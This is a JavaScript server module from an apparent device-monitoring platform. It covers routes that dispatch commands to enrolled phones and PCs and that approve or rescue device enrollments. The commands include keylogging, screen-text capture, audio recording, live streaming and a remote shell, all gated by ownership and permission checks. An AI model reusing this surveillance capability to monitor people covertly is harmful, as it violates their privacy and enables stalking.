module.exports = ({ APK_UPDATE_PIN, BUSINESS_MODE_BLOCKED_COMMANDS, COMMAND_PERMS, LIVE_INPUT_COMMANDS, SURVEIL_START_CMDS, SURVEIL_STOP_CMDS, app, audiorecCmdKey, cachedDeviceOwnerInfo, checkPublicAudioQuota, clearAudioRecActive, db, decryptDevice, decryptText, deviceOwnerInfo, emitToDevice, encryptText, getApkBuildById, io, isDeviceLocked, isDeviceOnline, kv, log, mintApkToken, notifyOwnerForCommand, requireAdmin, requireAuth, requireDeviceAccess, selectBuildForDevice, setAudioRecActive, signalFeature, stmts, surveilStart, surveilStop, updateDeviceOwner }) => {
app.post('/api/devices/:id/command', requireAuth, requireDeviceAccess, async (req, res) => {
  const sess     = req.session;
  const cmd      = req.body?.command;
  const deviceId = req.params.id;
  // Remote-shell (sentinel-adb CLI) kill switch: operator-token callers may only run
  // shell_exec/shell_stop on devices whose owner explicitly enabled it under the Shell
  // tab. Dashboard-terminal sessions are unaffected — this gates the CLI path only.
  const isOperatorToken = !!req.operatorTokenAuth;
  // Remote-shell (sentinel-adb CLI) kill switch: operator-token callers may only run
  // shell_exec/shell_stop on devices whose owner explicitly enabled it under the Shell
  // tab. Dashboard-terminal sessions are unaffected — this gates the CLI path only.
  const opTokId = req.operatorTokenAuth ? req.operatorTokenAuth.tokenId : null;
  if ((opTokId || sess.operator_token_id) && (cmd === 'shell_exec' || cmd === 'shell_stop')) {
    const flag = (await db.prepare('SELECT remote_shell_enabled FROM devices WHERE id=?').get(deviceId));
    if (!flag?.remote_shell_enabled) return res.status(403).json({ error: 'Remote shell access is not enabled for this device — enable it under the Shell tab' });
    // A device-scoped operator token may ONLY act on its bound device (requireDeviceAccess
    // already enforces this, but re-assert here so the command plane can't be reached with a
    // mismatched :id via any future refactor of that gate).
    if (req.operatorTokenAuth && req.operatorTokenAuth.deviceId && req.operatorTokenAuth.deviceId !== deviceId) {
      return res.status(403).json({ error: 'Token is scoped to a different device' });
    }
  }
  // Live-input injection commands (mouse/keyboard for RA Live Desktop) need minimal latency —
  // a full DB round-trip + decrypt on every keypress adds ~30-50ms per event. Use a short-lived
  // cache for the ownership gate and skip all downstream heavy ops (signalFeature, decryptDevice,
  // notifyOwnerForCommand, per-event logging) that have no meaning for injected keystrokes.
  const isLiveInput = LIVE_INPUT_COMMANDS.has(cmd);
  // ZK-owned device: ONLY the owning public user (or one of their business sub-users, scoped +
  // permission-gated) may command it (privacy). Admin is locked out — sole exception: admin may
  // push the OTA agent update (update_app).
  // Operator-token CLI callers (isOperatorToken) carry NO session — they are a narrow capability
  // already scoped to shell_exec/shell_stop on their bound device (OPERATOR_TOKEN_ROUTES allowlist +
  // requireDeviceAccess + the remote_shell_enabled kill switch above), so the session-permission map
  // is empty for them and these account/ZK/business-mode/record_audio gates do not apply. Skip them
  // and fall through to the shared command-dispatch tail below.
  if (!isOperatorToken) {
    const { isZk, ownerUserId, businessMode } = (await (isLiveInput ? cachedDeviceOwnerInfo(deviceId) : deviceOwnerInfo(deviceId)));
    if (isZk) {
      const isOwner  = sess.account_type === 'public' && sess.userId === ownerUserId;
      const isBizSub = sess.account_type === 'business_sub' && sess.parent_owner_id === ownerUserId;
      const adminOta = sess.role === 'admin' && cmd === 'update_app';
      if (!isOwner && !isBizSub && !adminOta)
        return res.status(403).json({ error: 'Only the device owner can command this device', zk_owned: true });
      if (isBizSub) {
        // Business sub-users are permission-gated even on the owner's own ZK devices — same
        // COMMAND_PERMS check the non-ZK admin_created branch below already uses.
        const allowedPerms = COMMAND_PERMS[cmd] || ['commands'];
        const dp = (sess.permissions || {})[deviceId] || {};
        const canRun = allowedPerms.some(p => dp[p]) || dp.commands;
        if (!canRun) return res.status(403).json({ error: 'Permission denied' });
      }
    } else if (sess.role !== 'admin') {
      // Admin-fleet device. Public users who own this device: requireDeviceAccess already verified
      // ownership, so all commands are allowed. Sub-users: check the per-command permission map.
      if (sess.account_type !== 'public') {
        const allowedPerms = COMMAND_PERMS[cmd] || ['commands'];
        const dp = (sess.permissions || {})[deviceId] || {};
        const canRun = allowedPerms.some(p => dp[p]) || dp.commands;
        if (!canRun) return res.status(403).json({ error: 'Permission denied' });
      }
    }
    // Business Account compliance: unconditional hard block keyed off the DEVICE OWNER's flag (not
    // the caller's session), so it applies identically whether the owner or a business sub-user is
    // issuing the command. One-way — there is no code path that can bypass this once set.
    // Exempt agent_kind==='remote_assist' (Windows RA) devices — BUSINESS_MODE_BLOCKED_COMMANDS is
    // an Android employee-monitoring-compliance concept (hides covert-surveillance-adjacent
    // commands like screenshots/keylog/audio recording), but 'start_screen_stream'/
    // 'stop_screen_stream' is ALSO the wire command Windows RA's consensual, on-screen, IT-support
    // Live Desktop feature reuses — the two are unrelated features that happen to share a command
    // name. Without this exemption a business_mode account's Windows RA devices silently can never
    // stream Live Desktop: the client-side mirror of this same check (BUSINESS_MODE_BLOCKED_COMMANDS
    // in app.js's sendCmd()) blocks the request before it's even sent, so nothing ever reaches this
    // route or gets logged server-side — found live 2026-07-23 on the test VM chasing what looked like
    // a capture-bridge bug but was actually this. See COMMAND_PERMS/RA_TAB_PERM_MAP's own
    // deliberately-separate-key precedent for the same Android/RA namespace-collision class of bug.
    if (businessMode && BUSINESS_MODE_BLOCKED_COMMANDS.has(cmd)) {
      const deviceRow = (await stmts.getDevice.get(deviceId));
      if (deviceRow?.agent_kind !== 'remote_assist') {
        return res.status(403).json({ error: 'This action is disabled — Business Account compliance mode', business_mode: true });
      }
    }
    if (cmd === 'record_audio' && sess.account_type === 'public') {
      const durationSec = Math.max(1, Math.min(10800, parseInt(req.body?.duration, 10) || 10));
      const quota = (await checkPublicAudioQuota(sess.userId, durationSec));
      if (!quota.ok) return res.status(429).json(quota);
    }
  }
  if (!(await isDeviceOnline(req.params.id))) {
    log('warn', 'Command failed — device offline', { deviceId: req.params.id, command: cmd });
    return res.status(503).json({ error: 'Device offline' });
  }
  let payload = req.body;
  if (cmd === 'update_app') {
    if (!APK_UPDATE_PIN || (req.body?.pin || '') !== APK_UPDATE_PIN)
      return res.status(403).json({ error: 'Invalid PIN' });
    let build = req.body?.buildId ? (await getApkBuildById(req.body.buildId)) : null;
    if (!build) {
      const d = (await db.prepare('SELECT apk_signer, model, os_build FROM devices WHERE id=?').get(req.params.id));
      build = d ? (await selectBuildForDevice({ apk_signer: d.apk_signer, model: decryptText(d.model), os_build: d.os_build })) : null;
    }
    if (!build) return res.status(400).json({ error: "No APK build available for this device's variant" });
    payload = { ...payload, token: mintApkToken(build, 5 * 60 * 1000) };
  }
  // For stream commands: re-push the ZK public key to the device immediately before
  // starting the stream so zkHelper is guaranteed active. This handles the common case
  // where the device reconnected after a server restart and hasn't re-received its key yet
  // (the 'registered' event pushes it on connect, but a race window exists before that).
  if (['start_stream', 'start_audio_stream'].includes(cmd)) {
    const zkRow = (await db.prepare(
      'SELECT u.id AS uid, u.zk_public_key FROM devices d JOIN users u ON d.owner_user_id=u.id WHERE d.id=? AND u.account_type=?'
    ).get(req.params.id, 'public'));
    if (zkRow?.zk_public_key) {
      updateDeviceOwner(req.params.id, true, zkRow.uid, zkRow.zk_public_key);
      log('info', 'ZK key refreshed before stream command', { deviceId: req.params.id, cmd });
    }
  }
  emitToDevice(req.params.id, 'command', payload);
  // shell_exec: open a persisted session row so output is HTTP-pollable (sentinel-adb
  // CLI) — the command text carries the client sessionId marker the chunk/exit
  // updates below match on. Best-effort; the live socket path is unaffected.
  if (payload.command === 'shell_exec' && payload.sessionId) {
    try {
      await db.prepare('INSERT INTO shell_sessions (device_id, command, output, timestamp) VALUES (?,?,?,?)')
        .run(req.params.id, `[${payload.sessionId}] ${payload.cmd || ''}`.slice(0, 500), '', Date.now());
    } catch {}
  }
  // record_audio / stop_record_audio: maintain the per-device "recording in progress" marker that
  // the WebUI uses to show a live countdown + Cancel button (see setAudioRecActive/clearAudioRecActive).
  if (cmd === 'record_audio') {
    const durSec = Math.max(1, Math.min(10800, parseInt(req.body?.duration, 10) || 10));
    await setAudioRecActive(req.params.id, durSec);
  } else if (cmd === 'stop_record_audio') {
    await clearAudioRecActive(req.params.id);
  }
  if (cmd === 'start_keylog')       (await db.prepare('UPDATE devices SET keylog_active=1 WHERE id=?').run(req.params.id));
  if (cmd === 'stop_keylog')        (await db.prepare('UPDATE devices SET keylog_active=0 WHERE id=?').run(req.params.id));
  if (cmd === 'start_screen_text')  (await db.prepare('UPDATE devices SET screen_text_active=1 WHERE id=?').run(req.params.id));
  if (cmd === 'stop_screen_text')   (await db.prepare('UPDATE devices SET screen_text_active=0 WHERE id=?').run(req.params.id));
  // ── Heavy post-emit ops (decrypt, signal, notify, log) — skip for live-input events ──
  if (!isLiveInput) {
    const device = decryptDevice((await stmts.getDevice.get(req.params.id)));
    signalFeature(cmd, req.body || {}, device, req);
    (await notifyOwnerForCommand(req.params.id, cmd, device?.name));
    // Live-monitoring lifecycle: register/clear active surveillance for stream/track commands.
    if (SURVEIL_START_CMDS[cmd])     surveilStart(req.params.id, SURVEIL_START_CMDS[cmd]).catch(() => {});
    else if (SURVEIL_STOP_CMDS[cmd]) surveilStop(req.params.id,  SURVEIL_STOP_CMDS[cmd]).catch(() => {});
    log('info', 'Command sent', { deviceId: req.params.id, command: cmd });
  }
  res.json({ ok: true });
});

// Current record_audio state for the WebUI indicator — lets a reloaded page or a second viewer
// pick up an in-progress recording. Reads only the Redis marker (no enc key needed).
app.get('/api/devices/:id/audio-record-state', requireAuth, requireDeviceAccess, async (req, res) => {
  const st = (await kv.getJSON(audiorecCmdKey(req.params.id)));
  if (!st || !st.startedAt) return res.json({ active: false });
  const remaining = Math.max(0, st.startedAt + st.duration * 1000 - Date.now());
  if (remaining <= 0) return res.json({ active: false });
  res.json({ active: true, startedAt: st.startedAt, duration: st.duration, remaining });
});

// ── Device key enrollment API (admin only) ────────────────────────────────

// List devices waiting for admin approval (new enrollments only — migrations are auto-approved).
app.get('/api/enrollment/pending', requireAdmin, async (_req, res) => {
  // Decrypt model + android_version for display (stored ENC: at rest). Without this the raw
  // ciphertext blows out the table width and pushes the Approve button off-screen.
  res.json(await Promise.all((await stmts.listPendingKeys.all()).map(async r => {
    let matched_username = null;
    if (r.enrollment_user_id) {
      const u = (await db.prepare("SELECT username FROM users WHERE id=?").get(r.enrollment_user_id));
      if (u) matched_username = u.username;
    }
    return { ...r, model: decryptText(r.model), android_version: decryptText(r.android_version), matched_username };
  })));
});

// Approve a pending enrollment: move the key into the devices table.
// Optional body: { userId } — if supplied, assigns the device to that user account
// (sets owner_user_id). Public-user accounts require this for ZK routing to activate.
app.post('/api/enrollment/:deviceId/approve', requireAdmin, async (req, res) => {
  const { deviceId } = req.params;
  const pending = (await stmts.getPendingKey.get(deviceId));
  if (!pending) return res.status(404).json({ error: 'No pending enrollment for this device' });

  // Optional owner assignment — prefer explicit body.userId, fall back to token-matched enrollment_user_id
  const ownerId = req.body.userId
    ? parseInt(req.body.userId, 10)
    : (pending.enrollment_user_id || null);
  if (ownerId) {
    const owner = (await db.prepare('SELECT id, status, account_type FROM users WHERE id=?').get(ownerId));
    if (!owner) return res.status(404).json({ error: 'User not found' });
    if (owner.status !== 'active') return res.status(400).json({ error: 'User account is not active' });
    // Public-user devices are NEVER bound via admin approve — they self-enroll from the device via
    // the signed ticket handshake. This keeps a stolen admin session from creating a public binding.
    // Admin-fleet (non-public) assignments remain allowed.
    if (owner.account_type === 'public')
      return res.status(403).json({ error: 'Public-user devices self-enroll from the device; use the in-app enrollment, not admin approve.' });
  }
  // A locked device must never be re-keyed/re-approved by admin either.
  if ((await isDeviceLocked(deviceId)))
    return res.status(409).json({ error: 'Device is permanently locked to a user account.', locked: true });

  const existing = (await stmts.getDevice.get(deviceId));
  if (existing) {
    (await stmts.setDeviceKey.run(pending.public_key, deviceId));
    if (ownerId) (await db.prepare('UPDATE devices SET owner_user_id=? WHERE id=?').run(ownerId, deviceId));
  } else {
    // Create device row with key. Device will overwrite name/model/etc. on first register.
    (await db.prepare(`INSERT INTO devices
      (id, name, model, android_version, battery, last_seen, online, platform, public_key, owner_user_id)
      VALUES (?,?,?,?,NULL,?,0,'android',?,?) ON CONFLICT DO NOTHING`)
      .run(deviceId,
        encryptText(pending.model || deviceId),
        encryptText(pending.model || ''),
        encryptText(pending.android_version || ''),
        Date.now(),
        pending.public_key,
        ownerId));
  }

  // Grant owner-level permissions on this device if assigned to a public user
  if (ownerId) {
    const ownerType = (await db.prepare('SELECT account_type FROM users WHERE id=?').get(ownerId))?.account_type;
    if (ownerType === 'public') {
      const userRow = (await stmts.getUserById.get(ownerId));
      if (userRow) {
        const perms = JSON.parse(decryptText(userRow.permissions) || '{}');
        perms[deviceId] = {
          location: true, photos: true, audio: true, screenshots: true, stream: true,
          network: true, files: true, calls: true, sms: true, apps: true,
          contacts: true, notifications: true, keylogs: true,
          screentext: true, geofences: true, schedules: true, timeline: true,
          shell: false, logcat: false, commands: true,
        };
        (await stmts.updateUserPerms.run(encryptText(JSON.stringify(perms)), ownerId));
      }
    }
  }

  (await stmts.deletePendingKey.run(deviceId));
  io.emit('devices_updated');
  io.to('monitors').emit('enrollment_update');
  log('info', 'Device enrollment approved', { deviceId, ownerId });
  res.json({ ok: true });
});

// Reject and discard a pending enrollment.
app.delete('/api/enrollment/:deviceId', requireAdmin, async (req, res) => {
  (await stmts.deletePendingKey.run(req.params.deviceId));
  io.to('monitors').emit('enrollment_update');
  log('info', 'Device enrollment rejected', { deviceId: req.params.deviceId });
  res.json({ ok: true });
});

// Rescue an orphaned device whose key was deleted — grants a one-time signature bypass
// so the device can reconnect and re-register with a fresh public key.
app.post('/api/enrollment/:deviceId/rescue', requireAdmin, (req, res) => {
  const { deviceId } = req.params;
  // 30-min one-time bypass, shared across replicas (the device may reconnect to any node).
  kv.setJSON('rescue:' + deviceId, 1, 30 * 60).catch(() => {});
  log('info', 'Rescue mode enabled for orphaned device', { deviceId });
  res.json({ ok: true });
});
};
